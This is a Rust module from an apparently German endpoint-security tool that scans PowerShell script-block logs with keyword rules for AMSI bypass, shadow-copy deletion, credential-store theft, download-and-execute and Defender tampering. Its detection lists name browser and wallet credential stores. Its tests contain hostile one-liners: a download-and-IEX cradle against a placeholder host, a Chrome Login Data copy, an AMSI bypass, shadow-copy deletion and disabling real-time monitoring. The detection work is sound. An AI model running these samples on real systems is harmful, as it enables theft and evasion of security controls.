//! PowerShell script blocks (Microsoft-Windows-PowerShell, event 4104): PowerShell hands
//! every script block to ETW in plain text right before running it – also obfuscated and
//! encoded ones. Without the policy "Script Block Logging" only blocks PowerShell itself
//! considers suspicious are logged; with it, all of them.
//!
//! The script text is only checked in memory. Stored are rule, hash and a short, masked
//! excerpt – never the script (it may contain passwords).

use std::path::PathBuf;

use crate::model::{Finding, Kind, Severity};

/// Script block parts larger than this are cut (a block can be split into many events).
pub const MAX_SCRIPT: usize = 1024 * 1024;

/// One rule: all groups must match (any word of a group, case-insensitive).
struct Rule {
    id: &'static str,
    title: &'static str,
    severity: Severity,
    all_of: &'static [&'static [&'static str]],
}

const DOWNLOAD: &[&str] = &[
    "downloadstring", "downloaddata", "downloadfile", "invoke-webrequest", "iwr ", "invoke-restmethod", "irm ", "net.webclient",
    "start-bitstransfer", "system.net.http.httpclient",
];
/// Runs the downloaded code in memory (no file on disk for a scanner to see).
const EXECUTE: &[&str] = &[
    "iex", "invoke-expression", ".invoke(", "[scriptblock]::create", "[reflection.assembly]::load", "[system.reflection.assembly]::load",
];
/// Starts a (downloaded) file – also what ordinary installer scripts do, hence only Mittel.
const START_FILE: &[&str] = &["start-process", "saps "];
const LOGIN_STORES: &[&str] = &[
    "login data", "\\cookies", "local state", "web data", "loginusers.vdf", "\\tdata", "key4.db", "logins.json", "\\discord\\local storage",
    "\\wallets\\", "\\exodus\\", "\\electrum\\",
];
const COLLECT: &[&str] = &["copy-item", "readallbytes", "system.data.sqlite", "compress-archive", "invoke-restmethod", "uploadfile", "uploaddata", "esentutl"];

const RULES: &[Rule] = &[
    Rule {
        id: "SKRIPT:AMSI-UMGEHUNG",
        title: "PowerShell-Skript schaltet die Schadsoftware-Prüfung von Windows (AMSI) ab",
        severity: Severity::Kritisch,
        all_of: &[&["amsiutils", "amsiinitfailed", "amsiscanbuffer", "amsicontext"]],
    },
    Rule {
        id: "SKRIPT:WIEDERHERSTELLUNG",
        title: "PowerShell-Skript löscht Schattenkopien oder Sicherungen – typisch für Ransomware",
        severity: Severity::Kritisch,
        all_of: &[&["vssadmin delete shadows", "win32_shadowcopy", "wbadmin delete", "bcdedit /set {default} recoveryenabled no"], &["delete", "recoveryenabled"]],
    },
    Rule {
        id: "SKRIPT:ZUGANGSDATEN",
        title: "PowerShell-Skript greift auf gespeicherte Zugangsdaten zu (Browser, Steam, Discord, Telegram, Wallets)",
        severity: Severity::Hoch,
        all_of: &[LOGIN_STORES, COLLECT],
    },
    Rule {
        id: "SKRIPT:LADEN-UND-AUSFUEHREN",
        title: "PowerShell-Skript lädt Code aus dem Internet und führt ihn aus",
        severity: Severity::Hoch,
        all_of: &[DOWNLOAD, EXECUTE],
    },
    Rule {
        id: "SKRIPT:LADEN-UND-STARTEN",
        title: "PowerShell-Skript lädt eine Datei aus dem Internet und startet sie",
        severity: Severity::Mittel,
        all_of: &[DOWNLOAD, START_FILE],
    },
    Rule {
        id: "SKRIPT:SPEICHER-LADEN",
        title: "PowerShell-Skript lädt ein verstecktes Programm direkt in den Speicher",
        severity: Severity::Hoch,
        all_of: &[&["frombase64string"], &["reflection.assembly]::load", "virtualalloc", "createthread"]],
    },
    Rule {
        id: "SKRIPT:SCHUTZ-ABSCHALTEN",
        title: "PowerShell-Skript versucht, den Virenschutz abzuschwächen",
        severity: Severity::Hoch,
        all_of: &[&["set-mppreference", "add-mppreference"], &["-disablerealtimemonitoring", "-exclusionpath", "-exclusionprocess", "-disableioavprotection"]],
    },
];

/// Checks a script block. Returns the first matching rule (most severe first) and the
/// position of the first hit (for the excerpt).
pub fn assess(text: &str) -> Option<(&'static str, &'static str, Severity, usize)> {
    let lower = text.to_lowercase();
    let mut best: Option<(&'static str, &'static str, Severity, usize)> = None;
    for r in RULES {
        let mut first = None;
        let all = r.all_of.iter().all(|group| {
            let hit = group.iter().filter_map(|w| lower.find(w)).min();
            if first.is_none() {
                first = hit;
            }
            hit.is_some()
        });
        if all && best.as_ref().is_none_or(|b| r.severity > b.2) {
            best = Some((r.id, r.title, r.severity, first.unwrap_or(0)));
        }
    }
    best
}

/// Short excerpt around `pos` with long encoded runs and quoted strings masked.
pub fn excerpt(text: &str, pos: usize) -> String {
    let chars: Vec<char> = text.chars().collect();
    // `pos` is a byte offset into the lower-case text; close enough as a char index for ASCII scripts.
    let at = text.char_indices().take_while(|(i, _)| *i < pos).count().min(chars.len());
    let start = at.saturating_sub(60);
    let end = (at + 120).min(chars.len());
    let raw: String = chars[start..end].iter().collect();
    let mut out = String::new();
    let mut quote: Option<char> = None;
    let mut run = String::new();
    let flush = |run: &mut String, out: &mut String| {
        if run.chars().count() >= 24 {
            out.push_str("[…]");
        } else {
            out.push_str(run);
        }
        run.clear();
    };
    for c in raw.chars() {
        match quote {
            Some(q) if c == q => {
                out.push_str("***");
                out.push(c);
                quote = None;
            }
            Some(_) => {}
            None if c == '"' || c == '\'' => {
                flush(&mut run, &mut out);
                out.push(c);
                quote = Some(c);
            }
            None if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' => run.push(c),
            None => {
                flush(&mut run, &mut out);
                out.push(if c.is_whitespace() { ' ' } else { c });
            }
        }
    }
    if quote.is_some() {
        out.push_str("***");
    }
    flush(&mut run, &mut out);
    let collapsed = out.split_whitespace().collect::<Vec<_>>().join(" ");
    format!("{}{}{}", if start > 0 { "… " } else { "" }, collapsed, if end < chars.len() { " …" } else { "" })
}

/// Finding for a matching script block. Fingerprint: rule + hash of the script text,
/// so a "Freigabe" covers exactly this script.
#[allow(clippy::too_many_arguments)]
pub fn finding(rule: &str, title: &str, sev: Severity, text: &str, pos: usize, script_path: &str, pid: u32, program: &str) -> Finding {
    let script_hash = crate::sha256_hex(text.as_bytes());
    let name = std::path::Path::new(program).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "powershell.exe".into());
    let wo = if script_path.is_empty() { t!("eingegebenes oder geladenes Skript (ohne Datei)", "typed or loaded script (without a file)").to_string() } else { script_path.to_string() };
    Finding {
        path: PathBuf::from(tf!("PowerShell-Skript in {name}: {wo}", "PowerShell script in {name}: {wo}")),
        sha256: crate::sha256_hex(format!("skript|{rule}|{script_hash}").as_bytes()),
        size: text.len() as u64,
        rule_id: rule.to_string(),
        threat_name: crate::sprache::tr(title).to_string(),
        category: t!("Verdächtiges Skript", "Suspicious script").into(),
        severity: sev,
        engine: "dienst".into(),
        kind: Kind::Prozess,
        details: Some(serde_json::json!({
            "pid": pid, "ziel": program, "befehl": "", "eltern": "",
            "skript": excerpt(text, pos), "skriptdatei": script_path, "skript_sha256": script_hash,
            "hinweis": t!("Ausschnitt gekürzt, Zeichenketten maskiert – das Skript selbst wird nicht gespeichert. Kennst du das Skript nicht: „Prozess beenden“ (falls es noch läuft) und einen vollständigen Scan starten.", "Excerpt shortened, strings masked – the script itself is not stored. If you do not know the script: “End process” (if it is still running) and start a full scan."),
        })),
    }
}

/// Collects the parts of split script blocks (MessageNumber/MessageTotal) per block ID.
#[derive(Default)]
pub struct Assembler {
    parts: std::collections::HashMap<String, (usize, Vec<Option<String>>, std::time::Instant)>,
}

impl Assembler {
    /// Adds a part; returns the whole text once all parts are there.
    pub fn add(&mut self, id: &str, number: usize, total: usize, text: String) -> Option<String> {
        if total <= 1 {
            return Some(text);
        }
        let total = total.min(1024);
        self.parts.retain(|_, (_, _, t)| t.elapsed() < std::time::Duration::from_secs(300));
        let entry = self.parts.entry(id.to_string()).or_insert_with(|| (0, vec![None; total], std::time::Instant::now()));
        if let Some(slot) = entry.1.get_mut(number.saturating_sub(1)) {
            if slot.is_none() {
                entry.0 += text.len();
                *slot = Some(text);
            }
        }
        if entry.1.iter().all(Option::is_some) || entry.0 > MAX_SCRIPT {
            let (_, parts, _) = self.parts.remove(id)?;
            return Some(parts.into_iter().flatten().collect());
        }
        None
    }
}

/// Registry keys of the policy "Script Block Logging" (Windows PowerShell and PowerShell 7).
pub const POLICY_KEYS: [&str; 2] = [
    "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
    "SOFTWARE\\Policies\\Microsoft\\PowerShellCore\\ScriptBlockLogging",
];
pub const POLICY_VALUE: &str = "EnableScriptBlockLogging";

/// State of the policy for Windows PowerShell and PowerShell 7.
pub fn policy_state() -> [bool; 2] {
    POLICY_KEYS.map(|k| crate::winreg::read_dword(crate::winreg::HKLM, k, POLICY_VALUE) == Some(1))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_rule_has_an_english_title() {
        for r in RULES {
            assert!(crate::sprache::english(r.title).is_some(), "{}", r.title);
        }
    }

    #[test]
    fn typical_attack_scripts_are_recognised() {
        let dl = "$c = (New-Object Net.WebClient).DownloadString('http://beispiel.invalid/a'); IEX $c";
        assert_eq!(assess(dl).map(|r| r.0), Some("SKRIPT:LADEN-UND-AUSFUEHREN"));
        let steal = r#"Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" $env:TEMP\x"#;
        assert_eq!(assess(steal).map(|r| (r.0, r.2)), Some(("SKRIPT:ZUGANGSDATEN", Severity::Hoch)));
        let amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')";
        assert_eq!(assess(amsi).map(|r| r.2), Some(Severity::Kritisch));
        let vss = "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }";
        assert_eq!(assess(vss).map(|r| r.0), Some("SKRIPT:WIEDERHERSTELLUNG"));
        let mp = "Set-MpPreference -DisableRealtimeMonitoring $true";
        assert_eq!(assess(mp).map(|r| r.0), Some("SKRIPT:SCHUTZ-ABSCHALTEN"));
        // Download and start a file (what installer scripts do too): only Mittel.
        let inst = "Invoke-WebRequest https://beispiel.invalid/setup.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe";
        assert_eq!(assess(inst).map(|r| (r.0, r.2)), Some(("SKRIPT:LADEN-UND-STARTEN", Severity::Mittel)));
        // Download and run in memory stays Hoch, also when a file is started as well.
        let sb = "$t = Invoke-RestMethod https://beispiel.invalid/x; & ([ScriptBlock]::Create($t))";
        assert_eq!(assess(sb).map(|r| (r.0, r.2)), Some(("SKRIPT:LADEN-UND-AUSFUEHREN", Severity::Hoch)));
        assert_eq!(assess(&format!("{inst}\n{dl}")).map(|r| (r.0, r.2)), Some(("SKRIPT:LADEN-UND-AUSFUEHREN", Severity::Hoch)));
        // Both a download and AMSI: the most severe rule wins.
        assert_eq!(assess(&format!("{amsi}\n{dl}")).map(|r| r.2), Some(Severity::Kritisch));
    }

    #[test]
    fn ordinary_scripts_stay_quiet() {
        for s in [
            "Get-ChildItem C:\\Users | Sort-Object Length",
            "Invoke-WebRequest https://example.com -OutFile x.zip; Expand-Archive x.zip",
            "Start-Process notepad.exe",
            "Get-Content \"$env:APPDATA\\Mozilla\\Firefox\\profiles.ini\"",
            "Set-MpPreference -SignatureUpdateInterval 4",
        ] {
            assert_eq!(assess(s), None, "{s}");
        }
    }

    #[test]
    fn excerpt_masks_strings_and_encoded_runs() {
        let text = "$p = 'GeheimesPasswort123'; $b = [Convert]::FromBase64String(\"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=\"); powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAB";
        let e = excerpt(text, text.to_lowercase().find("frombase64").unwrap());
        assert!(!e.contains("GeheimesPasswort123"), "{e}");
        assert!(!e.contains("QUJDREVGR0hJSktM"), "{e}");
        assert!(!e.contains("SQBFAFgAIAAoAE4A"), "{e}");
        assert!(e.contains("FromBase64String"), "{e}");
    }

    #[test]
    fn split_blocks_are_joined_and_findings_never_hold_the_script() {
        let mut a = Assembler::default();
        assert_eq!(a.add("x", 1, 2, "IEX (New-Object Net.Web".into()), None);
        let whole = a.add("x", 2, 2, "Client).DownloadString('http://beispiel.invalid/b')".into()).unwrap();
        let (rule, title, sev, pos) = assess(&whole).unwrap();
        let f = finding(rule, title, sev, &whole, pos, "", 42, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
        let d = f.details.unwrap();
        assert!(!d.to_string().contains("beispiel.invalid/b"), "Zeichenketten maskiert");
        assert_eq!(d["skript_sha256"], crate::sha256_hex(whole.as_bytes()));
        assert_eq!(a.add("y", 1, 1, "eins".into()).as_deref(), Some("eins"));
    }
}
